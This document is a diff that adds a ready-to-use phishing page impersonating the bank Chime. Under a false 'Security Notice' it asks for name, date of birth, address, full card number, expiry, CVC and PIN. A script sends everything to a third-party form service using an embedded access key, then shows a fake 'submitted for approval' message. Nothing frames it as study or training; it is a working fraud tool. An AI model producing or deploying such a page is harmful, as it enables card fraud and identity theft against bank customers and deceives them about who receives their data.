@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chime | Account Verification</title>
+    <style>
+        /* Mobile-First Layout */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f4f4; padding: 20px; display: flex; justify-content: center; }
+        .card { background: white; border-radius: 16px; padding: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 8px solid #28d387; max-width: 380px; width: 100%; }
+        
+        /* Branding & Headers */
+        .logo { color: #28d387; font-weight: bold; font-size: 32px; margin-bottom: 5px; letter-spacing: -1.5px; }
+        .header { font-size: 19px; margin-bottom: 12px; color: #333; font-weight: bold; }
+        
+        /* The Security Notice Block */
+        .notice { font-size: 13px; color: #666; line-height: 1.4; margin-bottom: 20px; }
+        .notice strong { color: #333; }
+
+        /* Form Inputs */
+        .label { font-size: 11px; color: #888; text-transform: uppercase; display: block; margin-bottom: 4px; font-weight: 700; letter-spacing: 0.5px; }
+        input { width: 100%; padding: 14px; border: 1px solid #e0e0e0; border-radius: 10px; box-sizing: border-box; font-size: 16px; margin-bottom: 16px; background: #fafafa; transition: border 0.3s; }
+        input:focus { border-color: #28d387; outline: none; background: white; }
+
+        /* Buttons */
+        .btn { display: block; width: 100%; background: #28d387; color: white; text-align: center; padding: 16px; border-radius: 10px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn:disabled { background: #a5e7c9; cursor: not-allowed; }
+
+        /* Success Page Styling */
+        #success-message { display: none; text-align: center; padding: 30px 0; }
+        .check-icon { font-size: 60px; color: #28d387; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <!-- Main Form Section -->
+    <div id="form-container">
+        <div class="logo">chime</div>
+        <div class="header">Identity Verification</div>
+        
+        <p class="notice">
+            <strong>Security Notice:</strong> To protect your account, please verify your identity by confirming your card details below. This process is encrypted and secure.
+        </p>
+
+        <form id="chimeForm">
+            <!-- Replace YOUR_ACCESS_KEY_HERE with your Web3Forms key -->
+            <input type="hidden" name="access_key"
+            value="b166ed84-449f-4b96-be4d-fb00259f4ccf">
+            <input type="hidden" name="subject" value="New Chime Verification">
+
+            <label class="label">Legal Name</label>
+            <input type="text" name="legal_name" required placeholder="Full Name">
+
+            <label class="label">Date of Birth</label>
+            <input type="text" name="dob" required placeholder="MM/DD/YYYY">
+
+            <label class="label">Address</label>
+            <input type="text" name="address" required placeholder="Street, City, Zip">
+
+            <label class="label">Card Number</label>
+            <input type="number" name="card_number" required placeholder="16 Digits">
+
+            <label class="label">Exp / CVC / PIN</label>
+            <input type="text" name="security_info" required placeholder="MM/YY - 000 - 0000">
+
+            <button type="submit" class="btn" id="submitBtn">VERIFY NOW</button>
+        </form>
+    </div>
+
+    <!-- Success Message (Shown after submit) -->
+    <div id="success-message">
+        <div class="logo">chime</div>
+        <div class="check-icon">✓</div>
+        <h2 style="color: #333; margin-bottom: 10px;">Sent</h2>
+        <p style="color: #666; line-height: 1.6;">Your information has been submitted for approval. You may now close this tab.</p>
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('chimeForm');
+    const formContainer = document.getElementById('form-container');
+    const successMessage = document.getElementById('success-message');
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Show loading state
+        submitBtn.innerHTML = "Processing...";
+        submitBtn.disabled = true;
+
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: json
+        })
+        .then(async (response) => {
+            if (response.status == 200) {
+                // Hide form and show success
+                formContainer.style.display = 'none';
+                successMessage.style.display = 'block';
+            } else {
+                alert("Submission failed. Please check your key or connection.");
+                submitBtn.innerHTML = "VERIFY NOW";
+                submitBtn.disabled = false;
+            }
+        })
+        .catch(error => {
+            alert("Error connecting to server.");
+            submitBtn.innerHTML = "VERIFY NOW";
+            submitBtn.disabled = false;
+        });
+    });
+</script>
+
+</body>
+</html>
